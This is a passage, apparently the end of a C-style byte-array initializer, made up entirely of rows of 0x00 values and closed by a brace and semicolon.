    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
} ;